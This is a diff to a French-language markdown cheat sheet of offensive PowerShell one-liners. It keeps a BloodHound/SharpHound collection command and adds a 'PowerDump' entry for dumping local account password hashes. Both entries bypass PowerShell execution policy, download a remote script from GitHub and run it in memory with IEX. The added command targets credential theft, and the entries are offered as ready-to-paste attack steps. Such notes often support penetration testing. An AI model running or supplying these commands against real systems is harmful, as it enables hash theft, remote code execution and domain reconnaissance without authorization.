@@ -20,10 +20,10 @@ Bloodhound :
 powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound
 ```
 
-Bloodhound :
+PowerDump : Permet de dumper les hashs des comptes locaux :
 
 ```markdown
-powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound
+powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://github.com/EmpireProject/Empire/raw/master/data/module_source/credentials/Invoke-PowerDump.ps1');Invoke-PowerDump
 ```
 
 # Header 1
